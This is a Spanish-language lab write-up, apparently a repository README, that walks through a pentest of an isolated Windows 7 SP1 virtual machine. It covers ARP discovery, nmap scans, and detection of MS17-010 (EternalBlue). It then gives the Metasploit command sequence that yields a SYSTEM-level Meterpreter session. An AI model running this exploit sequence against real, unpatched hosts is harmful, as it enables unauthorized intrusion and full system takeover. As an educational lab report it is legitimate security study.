
# Laboratorio de Pentesting Metodológico sobre Windows 7 SP1

![Windows 7 Logo](https://i.imgur.com/gQYyC8p.png)

Este repositorio documenta el proceso completo de un pentest realizado a una máquina virtual Windows 7 Professional SP1 (64-bit), desde el reconocimiento inicial hasta la obtención de privilegios de `SYSTEM`.

**Disclaimer:** *Todas las actividades documentadas aquí se realizaron en un entorno de laboratorio controlado y aislado, con máquinas de mi propiedad. Este proyecto tiene fines exclusivamente educativos para estudiar y comprender las fases de un ciberataque y las vulnerabilidades de sistemas sin parches. No intentes replicar estas acciones en sistemas que no te pertenezcan o para los cuales no tengas permiso explícito.*

## Entorno del Laboratorio

Este pentest fue ejecutado utilizando las siguientes máquinas virtuales en la misma red local.

### Máquina Víctima
*   **Sistema Operativo:** Windows 7 Professional SP1 (64-bit)
*   **Dirección IP:** `192.168.1.13`
*   **Configuraciones Clave:** Firewall y Actualizaciones Automáticas desactivadas.

### Máquina de Ataque
La metodología descrita en este informe es agnóstica al sistema operativo del atacante. Las pruebas se realizaron y pueden ser reproducidas desde cualquiera de las siguientes configuraciones:

*   **Configuración 1: Arch Linux**
    *   **Distribución Base:** Arch Linux
    *   **Repositorios Adicionales:** BlackArch
    *   **Shell:** Zsh con Oh My Zsh

*   **Configuración 2: Kali Linux**
    *   **Distribución:** Kali Linux [2025.3]
    *   **Entorno de Escritorio:** [XFCE]

## Índice de Fases

1.  [Fase 1: Reconocimiento](#fase-1-reconocimiento)
2.  [Fase 2: Escaneo y Enumeración](#fase-2-escaneo-y-enumeración)
3.  [Fase 3: Análisis de Vulnerabilidades](#fase-3-análisis-de-vulnerabilidades)
4.  [Fase 4: Explotación](#fase-4-explotación)
5.  [Fase 5: Post-Explotación](#fase-5-post-explotación)
6.  [Lecciones Aprendidas](#lecciones-aprendidas)

---

## Fase 1: Reconocimiento

**Objetivo:** Identificar los hosts activos en la red y localizar la IP de nuestra máquina objetivo.

Se utilizó `netdiscover` para realizar un sondeo ARP en la red local.

```bash
sudo netdiscover -r 192.168.1.0/24
```

**Resultado:** Se identificó al host `192.168.1.13` como nuestro objetivo, confirmado por su dirección MAC asociada a VirtualBox (`PCS Systemtechnik GmbH`).

---

## Fase 2: Escaneo y Enumeración

**Objetivo:** Descubrir los puertos abiertos, los servicios en ejecución y las versiones de software en la máquina objetivo.

Se utilizó `nmap` para un escaneo exhaustivo de todos los puertos TCP.

```bash
sudo nmap -sS -sV -O -p- -oN nmap_scan.txt 192.168.1.13
```
*   `-sS`: SYN Scan (sigiloso)
*   `-sV`: Detección de versiones de servicios
*   `-O`: Detección de Sistema Operativo
*   `-p-`: Escanear todos los 65,535 puertos TCP

**Hallazgos Clave:**
- **Puerto 445/tcp:** Abierto, corriendo el servicio `microsoft-ds` (SMB). **Este se convirtió en el principal vector de ataque potencial.**
- **Puerto 139/tcp:** Abierto, corriendo `netbios-ssn`.
- **Puerto 135/tcp:** Abierto, corriendo `msrpc`.

---

## Fase 3: Análisis de Vulnerabilidades

**Objetivo:** Analizar el servicio SMB en el puerto 445 en busca de vulnerabilidades conocidas.

Se utilizó el Nmap Scripting Engine (NSE) para ejecutar scripts específicos de detección de vulnerabilidades en SMB.

```bash
sudo nmap -p445 --script="smb-vuln*" -oN smb_vuln_scan.txt 192.168.1.13
```

**Resultado Crítico:** El objetivo fue identificado como **VULNERABLE** a **MS17-010 (EternalBlue)**.

```
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     Risk factor: HIGH
```

---

## Fase 4: Explotación

**Objetivo:** Explotar la vulnerabilidad MS17-010 para obtener acceso remoto al sistema.

Se utilizó el **Metasploit Framework** para configurar y lanzar el exploit.

**Secuencia en `msfconsole`:**
```
# 1. Iniciar Metasploit
msfconsole

# 2. Buscar el exploit
msf > search ms17-010

# 3. Seleccionar el exploit EternalBlue
msf > use exploit/windows/smb/ms17_010_eternalblue

# 4. Configurar la IP del objetivo
msf exploit(...) > set RHOSTS 192.168.1.13

# 5. Lanzar el ataque
msf exploit(...) > exploit
```
**Resultado:** Se obtuvo una sesión de Meterpreter exitosa, confirmando el acceso completo al sistema.

![Meterpreter Session](https://i.imgur.com/9nFk2dZ.png)

---

## Fase 5: Post-Explotación

**Objetivo:** Determinar el nivel de acceso obtenido y demostrar el control sobre el sistema.

El primer comando ejecutado en la sesión de Meterpreter fue para verificar la identidad del usuario.

```
meterpreter > getuid
```

**Resultado:**
```
Server username: NT AUTHORITY\SYSTEM
```
Se obtuvo el máximo nivel de privilegios posible en un sistema Windows, completando el objetivo del pentest.

---

## Lecciones Aprendidas

- La importancia crítica de mantener los sistemas operativos actualizados y parcheados. Una sola vulnerabilidad sin parchear (MS17-010) fue suficiente para comprometer totalmente el sistema.
- La eficacia de una metodología estructurada (Reconocimiento -> Escaneo -> Explotación).
- La diferencia fundamental en la postura de seguridad por defecto entre un sistema antiguo (Windows 7) y uno moderno (Windows 10), como se demostró en los escaneos preliminares.


